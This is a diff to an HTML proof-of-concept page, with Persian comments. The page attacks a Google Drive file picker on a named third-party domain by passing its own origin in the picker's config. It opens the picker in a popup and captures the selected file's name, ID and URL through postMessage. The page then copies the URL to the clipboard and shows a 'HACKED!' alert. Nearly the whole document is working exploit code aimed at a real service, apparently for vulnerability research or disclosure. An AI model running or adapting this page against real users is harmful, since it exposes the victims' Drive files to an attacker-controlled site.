@@ -2,46 +2,123 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Front Picker PoC - FINAL</title>
+  <title>Front Picker PoC - Visual</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; margin: 0; }
+    h2 { color: #fff; border-bottom: 1px solid #444; padding-bottom: 10px; }
+    .status { padding: 10px; background: #333; border-radius: 5px; margin: 10px 0; }
+    .success { background: #1b5e20; color: #fff; }
+    .error { background: #b71c1c; color: #fff; }
+    #output { 
+      background: #111; 
+      padding: 15px; 
+      border-radius: 5px; 
+      white-space: pre-wrap; 
+      word-break: break-all;
+      border: 1px solid #444;
+      max-height: 70vh;
+      overflow-y: auto;
+    }
+    .label { color: #888; }
+    .value { color: #0f0; }
+    .highlight { color: #ffeb3b; font-weight: bold; }
+  </style>
 </head>
 <body>
-  <h2>🎯 Waiting for message...</h2>
-  <pre id="output" style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;"></pre>
+  <h2>🎯 Front Google Drive Picker PoC</h2>
+  
+  <div id="status" class="status">⏳ Opening popup... Select a file to test.</div>
+  
+  <div id="output">
+    <span class="label">Waiting for postMessage...</span>
+  </div>
 
   <script>
-    // ۱. لیسنر باید قبل از هر چیزی attach بشه
-    window.addEventListener("message", (e) => {
-      console.log("📨 Raw Event:", e);
-      
-      const out = document.getElementById("output");
-      out.textContent = "✅ Message Received!\nOrigin: " + e.origin + "\n\nData:\n" + JSON.stringify(e.data, null, 2);
-      
-      if(e.data?.type === "google-documents-selected" && e.data.documents?.[0]) {
-        out.textContent += "\n\n🎉 SUCCESS! File: " + e.data.documents[0].name;
-        alert("✅ HACKED! Check console");
-      }
-    }, false);
-
-    // ۲. کانفیگ تمیز - نکته حیاتی: origin باید دقیقاً برابر با location.origin باشه (بدون فاصله)
-    const myOrigin = window.location.origin; // این یعنی "https://attacker.com" - خودکار و دقیق
-    console.log("🎯 My Origin:", myOrigin);
+    // === ۱. تنظیمات ===
+    const PICKER_URL = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
+    const MY_ORIGIN = window.location.origin; // خودکار دامنه‌ی فعلی رو می‌گیره (بدون فاصله!)
 
     const config = {
       googleAppId: "754490832836",
       googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
-      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly", // بدون فاصله
+      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly",
       googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
-      origin: myOrigin // <<< استفاده از متغیر دقیق به جای تایپ دستی
+      origin: MY_ORIGIN // <<< حیاتی: باید دقیقاً برابر با origin صفحه باشه
     };
 
-    // ۳. باز کردن پاپ‌آپ
-    const baseUrl = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
-    const fullUrl = `${baseUrl}?config=${encodeURIComponent(JSON.stringify(config))}`;
+    // === ۲. تابع نمایش خروجی توی صفحه ===
+    function showOutput(title, data, isSuccess = false) {
+      const output = document.getElementById('output');
+      const status = document.getElementById('status');
+      
+      let html = `<div class="label">${title}</div>\n`;
+      
+      if (isSuccess && data?.documents?.[0]) {
+        const doc = data.documents[0];
+        status.textContent = "🎉 SUCCESS! File metadata captured!";
+        status.className = "status success";
+        
+        html += `\n<span class="highlight">📄 File: ${doc.name || 'N/A'}</span>\n`;
+        html += `<span class="label">• ID:</span> <span class="value">${doc.id || 'N/A'}</span>\n`;
+        html += `<span class="label">• URL:</span> <span class="value">${doc.url || 'N/A'}</span>\n`;
+        html += `<span class="label">• MimeType:</span> <span class="value">${doc.mimeType || 'N/A'}</span>\n`;
+        html += `\n<span class="label">🔻 Full JSON:</span>\n`;
+        html += JSON.stringify(data, null, 2);
+        
+        // کپی خودکار لینک فایل برای راحت‌تر شدن کار
+        if (doc.url) {
+          navigator.clipboard?.writeText(doc.url);
+          html += `\n\n<span class="highlight">📋 File URL copied to clipboard!</span>`;
+        }
+      } else {
+        html += JSON.stringify(data, null, 2);
+      }
+      
+      output.innerHTML = html;
+      console.log("[PoC] Page updated:", data);
+    }
+
+    // === ۳. گوش دادن به postMessage ===
+    window.addEventListener("message", (e) => {
+      console.log("📨 [PoC] Message received!", { origin: e.origin,  e.data });
+      
+      // نمایش دیتا توی صفحه
+      showOutput(`📨 Message from: ${e.origin}`, e.data, true);
+      
+      // اگر دیتای مفید اومد، آلرت هم بده
+      if(e.data?.type === "google-documents-selected" && e.data.documents?.length) {
+        setTimeout(() => {
+          alert("✅ HACKED!\n\nFile: " + (e.data.documents[0].name || "Unknown") + 
+                "\n\nCheck page for details.");
+        }, 100);
+      }
+    }, false);
+
+    // === ۴. باز کردن پاپ‌آپ ===
+    console.log("🎯 Opening picker popup...");
+    console.log("🔗 Config origin:", config.origin);
     
-    console.log("🔗 Opening URL:", fullUrl);
+    const fullUrl = `${PICKER_URL}?config=${encodeURIComponent(JSON.stringify(config))}`;
     const popup = window.open(fullUrl, "picker", "width=700,height=600");
-    
-    if(!popup) alert("❌ Popup blocked! Please allow popups for this site.");
+
+    // چک کردن وضعیت پاپ‌آپ
+    setTimeout(() => {
+      const status = document.getElementById('status');
+      if(!popup || popup.closed) {
+        status.textContent = "❌ Popup blocked or closed immediately!";
+        status.className = "status error";
+        showOutput("Error", { error: "Popup failed to open" });
+      } else {
+        // چک کردن دسترسی به opener
+        try {
+          popup.eval?.("window.opener ? '✅ opener accessible' : '❌ opener is null'")
+            .then?.(res => console.log("🔍 Popup says:", res))
+            .catch?.(() => console.log("🔍 Cannot eval in popup"));
+        } catch(e) {
+          console.log("🔍 Cannot access popup context");
+        }
+      }
+    }, 2000);
   </script>
 </body>
 </html>
